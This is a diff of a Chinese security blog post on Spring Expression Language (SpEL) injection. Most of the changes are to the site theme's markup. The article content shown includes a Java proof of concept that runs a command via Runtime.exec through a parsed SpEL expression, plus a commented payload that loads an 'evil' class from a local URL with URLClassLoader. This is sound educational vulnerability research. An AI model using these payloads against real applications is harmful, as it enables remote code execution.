@@ -1,56 +1,109 @@
 <!doctype html>
-<html lang="zh-CN" data-theme="light">
+<html lang="zh-CN">
 <head>
   <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#173f32">
-<meta name="description" content="卷毛肖恩的个人博客">
-<title>SPEL表达式注入 · CurlySean&#39;s Blog</title>
-<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
-<link rel="stylesheet" href="/fontawesome/solid.min.css">
-<link rel="stylesheet" href="/fontawesome/brands.min.css">
+<meta name="theme-color" content="#f7f7f4">
+<meta name="color-scheme" content="light">
+
+<title>SPEL表达式注入 — CurlySean&#39;s Blog</title>
+<meta name="description" content="这里是 CurlySean 的个人技术博客，记录漏洞研究、代码审计与攻防实践，整理可以复现、验证与继续推演的技术细节。">
+<link rel="canonical" href="http://curlysean.github.io/2025/03/29/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">
 <link rel="stylesheet" href="/css/style.css">
+<script>document.documentElement.classList.add('js')</script>
 
 <meta name="generator" content="Hexo 7.3.0"></head>
-<body class="page-post">
-  <a class="skip-link" href="#main">跳到正文</a>
-  <header class="site-header">
-  <div class="shell header-inner">
-    <a class="brand" href="/" aria-label="返回首页">
-      <span class="brand-mark" aria-hidden="true"><img src="/images/curly-sean-avatar.png" alt=""></span>
-      <span>卷毛肖恩<small>PERSONAL BLOG</small></span>
+<body class="page-type-post">
+  <a class="skip-link" href="#main-content">跳至正文</a>
+  
+<header class="site-header" data-header>
+  <div class="site-header__inner frame">
+    <a class="brand" href="/" aria-label="CurlySean&#39;s Blog 首页">
+      <span class="brand__name">CURLYSEAN</span>
+      <span class="brand__suffix">SECURITY NOTES</span>
     </a>
-    <button class="nav-toggle" type="button" aria-label="打开导航" aria-expanded="false"><i class="fa-solid fa-bars"></i></button>
-    <nav class="site-nav" aria-label="主导航">
+    <nav class="desktop-nav" aria-label="主导航">
       
-        <a href="/">首页</a>
+        <a class="desktop-nav__link" href="/">首页</a>
       
-        <a href="/archives/">归档</a>
+        <a class="desktop-nav__link" href="/archives/">文章</a>
       
-        <a href="/categories/">分类</a>
+        <a class="desktop-nav__link" href="/categories/">分类</a>
       
-        <a href="/tags/">标签</a>
+        <a class="desktop-nav__link" href="/tags/">标签</a>
       
-        <a href="/about/">关于</a>
+        <a class="desktop-nav__link" href="/about/">关于</a>
       
     </nav>
-    <div class="header-actions">
-      <button class="icon-button search-open" type="button" aria-label="搜索"><i class="fa-solid fa-magnifying-glass"></i></button>
-      <button class="icon-button theme-toggle" type="button" aria-label="切换深色模式"><i class="fa-solid fa-moon"></i></button>
-    </div>
+    <a class="header-cta" href="/archives/">开始阅读 <span aria-hidden="true">↗</span></a>
+    <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
+      <span class="sr-only">打开导航</span>
+      <span></span><span></span>
+    </button>
   </div>
+  <nav class="mobile-nav" id="mobile-menu" aria-label="移动端主导航" data-mobile-menu>
+    <div class="frame mobile-nav__inner">
+      
+        <a class="mobile-nav__link" href="/">
+          <span>01</span>首页<i aria-hidden="true">↗</i>
+        </a>
+      
+        <a class="mobile-nav__link" href="/archives/">
+          <span>02</span>文章<i aria-hidden="true">↗</i>
+        </a>
+      
+        <a class="mobile-nav__link" href="/categories/">
+          <span>03</span>分类<i aria-hidden="true">↗</i>
+        </a>
+      
+        <a class="mobile-nav__link" href="/tags/">
+          <span>04</span>标签<i aria-hidden="true">↗</i>
+        </a>
+      
+        <a class="mobile-nav__link" href="/about/">
+          <span>05</span>关于<i aria-hidden="true">↗</i>
+        </a>
+      
+    </div>
+  </nav>
 </header>
 
-  
-  <main id="main" class="site-main shell">
-    <div class="post-layout">
-  <article class="article-shell">
-    <header class="article-header">
-      <div class="post-meta"><time>2025.03.29</time><span>Java</span><span>约 26 分钟阅读</span></div>
-      <h1>SPEL表达式注入</h1>
-      <div class="post-tags"><a href="/tags/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">#表达式注入</a></div>
-    </header>
-    <div class="article-content"><h1 id="IbVG0">SPEL表达式注入</h1>
+  <main id="main-content">
+    
+<article class="post-page">
+  <header class="post-hero">
+    <div class="frame post-hero__grid reveal">
+      <div class="post-hero__label">
+        <p class="eyebrow">FIELD NOTE / 2025</p>
+        
+          <a href="/categories/Java/">Java ↗</a>
+        
+      </div>
+      <div class="post-hero__main">
+        <h1>SPEL表达式注入</h1>
+        
+      </div>
+    </div>
+    <div class="frame post-meta-grid reveal">
+      <div><span>发布</span><time datetime="2025-03-29T00:18:44.000Z">2025.03.29</time></div>
+      <div><span>更新</span><time datetime="2025-03-29T00:18:44.000Z">2025.03.29</time></div>
+      <div><span>阅读</span><strong>26 MIN</strong></div>
+      <div><span>标签</span><strong>1</strong></div>
+    </div>
+  </header>
+
+  <div class="frame post-content-layout">
+    <aside class="post-rail">
+      <div class="post-rail__inner">
+        <p class="eyebrow">ON THIS PAGE</p>
+        
+          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#IbVG0"><span class="toc-text">SPEL表达式注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RuxSh"><span class="toc-text">前置基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#v7p1e"><span class="toc-text">SPEL简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#I8qMI"><span class="toc-text">SPEL特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TmXL9"><span class="toc-text">SPEL类类型表达式T(Type)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ppdrd"><span class="toc-text">SPEL表达式用法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Q5jBl"><span class="toc-text">xml配置用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HXtQX"><span class="toc-text">注解@Value用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OmWfI"><span class="toc-text">Expression用法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cX58A"><span class="toc-text">步骤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#X5vQF"><span class="toc-text">Demo</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x0ioI"><span class="toc-text">SPEL表达式漏洞注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WsiFs"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sm9t8"><span class="toc-text">通过反射调用进行SpEL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TF3bm"><span class="toc-text">基础Poc与Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#xjOPg"><span class="toc-text">基础Poc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xcEpZ"><span class="toc-text">基础Bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#csoWt"><span class="toc-text">JavaScript Engine Bypass</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hZ0Qe"><span class="toc-text">利用类加载攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#oh6sk"><span class="toc-text">UrlClassloader</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#H1gIO"><span class="toc-text">AppClassLoader</span></a></li></ol></li></ol></li></ol></li></ol></nav>
+        
+      </div>
+    </aside>
+    <div class="article-column">
+      <div class="article-body reveal">
+        <h1 id="IbVG0">SPEL表达式注入</h1>
 <h2 id="RuxSh">前置基础</h2>
 <h3 id="v7p1e">SPEL简介</h3>
 在 Spring3 中引入了 Spring 表达式语言（Spring Expression Language，简称 SPEL），这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于 XML 和基于注解的 Spring 配置还有 bean 定义一起使用。 
@@ -193,39 +246,50 @@ Expression用法分为四步：首先构造一个解析器，其次使用解析�
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//String cmdStr = &quot;new java.net.URLClassLoader(new java.net.URL[]&#123;new java.net.URL(&#x27;http://127.0.0.1:8888/&#x27;)&#125;).loadClass(\&quot;evil\&quot;).getConstructors()[0].newInstance()&quot;;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmdStr</span> <span class="operator">=</span> <span class="string">&quot;T(java.lang.ClassLoader).getSystemClassLoader().loadClass(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>;</span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();<span class="comment">//创建解析器</span></span><br><span class="line">        <span class="type">Expression</span> <span class="variable">exp</span> <span class="operator">=</span> parser.parseExpression(cmdStr);<span class="comment">//解析表达式</span></span><br><span class="line">        System.out.println( exp.getValue() );<span class="comment">//弹出计算器</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740399279702-bbb2fa4f-d226-45b7-bb69-31ed1bb972ea.png"></p>
-</div>
-    <footer class="article-footer"><p><i class="fa-solid fa-seedling"></i> 本文由 CurlySean 原创记录，转载请注明出处。</p></footer>
-    <nav class="post-nav"><a href="/2025/04/01/C3P0%E9%93%BE/"><small>上一篇</small>C3P0链</a><a href="/2025/03/25/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"><small>下一篇</small>EL表达式注入</a></nav>
+
+      </div>
+      
+        <div class="post-tags" aria-label="文章标签">
+          
+            <a href="/tags/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"># 表达式注入</a>
+          
+        </div>
+      
+    </div>
+  </div>
+
+  <nav class="frame post-navigation" aria-label="相邻文章">
     
-
-
-  </article>
-  <aside class="toc-panel"><p class="eyebrow">ON THIS PAGE</p><h2>本文目录</h2><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#RuxSh"><span class="toc-text">前置基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#v7p1e"><span class="toc-text">SPEL简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#I8qMI"><span class="toc-text">SPEL特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TmXL9"><span class="toc-text">SPEL类类型表达式T(Type)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ppdrd"><span class="toc-text">SPEL表达式用法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Q5jBl"><span class="toc-text">xml配置用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HXtQX"><span class="toc-text">注解@Value用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OmWfI"><span class="toc-text">Expression用法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cX58A"><span class="toc-text">步骤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#X5vQF"><span class="toc-text">Demo</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x0ioI"><span class="toc-text">SPEL表达式漏洞注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WsiFs"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sm9t8"><span class="toc-text">通过反射调用进行SpEL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TF3bm"><span class="toc-text">基础Poc与Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#xjOPg"><span class="toc-text">基础Poc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xcEpZ"><span class="toc-text">基础Bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#csoWt"><span class="toc-text">JavaScript Engine Bypass</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hZ0Qe"><span class="toc-text">利用类加载攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#oh6sk"><span class="toc-text">UrlClassloader</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#H1gIO"><span class="toc-text">AppClassLoader</span></a></li></ol></li></ol></li></ol></div></aside>
-</div>
+      <a href="/2025/04/01/C3P0%E9%93%BE/">
+        <span>← PREVIOUS</span>
+        <strong>C3P0链</strong>
+      </a>
+    
+    
+      <a href="/2025/03/25/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">
+        <span>NEXT →</span>
+        <strong>EL表达式注入</strong>
+      </a>
+    
+  </nav>
+</article>
 
   </main>
   <footer class="site-footer">
-  <div class="shell footer-inner">
-    <p>© 2025–2026 卷毛肖恩 · 个人博客</p>
-    <div class="social-links">
-      <a href="https://github.com/CurlySean" target="_blank" rel="noopener" aria-label="GitHub"><i class="fa-brands fa-github"></i></a>
-      <a href="mailto:5345414e@gmail.com" aria-label="邮件"><i class="fa-solid fa-envelope"></i></a>
-      <a href="/atom.xml" aria-label="RSS"><i class="fa-solid fa-rss"></i></a>
+  <div class="frame site-footer__inner">
+    <div class="site-footer__identity">
+      <a href="/">CURLYSEAN</a>
+      <span>持续记录，保持验证。</span>
     </div>
+    <p class="site-footer__copyright">© 2026 CurlySean</p>
+    <nav class="site-footer__links" aria-label="外部链接">
+      <a href="https://github.com/CurlySean" target="_blank" rel="noopener">GitHub ↗</a>
+      <a href="mailto:5345414e@gmail.com">Email ↗</a>
+    </nav>
   </div>
 </footer>
+<button class="back-to-top" type="button" aria-label="返回顶部" data-back-to-top>↑</button>
+<script src="/js/main.js" defer></script>
 
-  <div class="search-panel" role="dialog" aria-modal="true" aria-label="站内搜索" hidden>
-  <div class="search-dialog">
-    <button class="search-close icon-button" type="button" aria-label="关闭搜索"><i class="fa-solid fa-xmark"></i></button>
-    <label for="site-search">搜索文章</label>
-    <div class="search-input-wrap"><i class="fa-solid fa-magnifying-glass"></i><input id="site-search" type="search" placeholder="输入标题、标签或正文关键词…" autocomplete="off"></div>
-    <p class="search-hint">按 ESC 关闭 · 输入至少 2 个字符</p>
-    <div class="search-results" aria-live="polite"></div>
-  </div>
-</div>
-
-  <button class="back-to-top" type="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up"></i></button>
-  <script src="/js/main.js"></script>
 </body>
 </html>
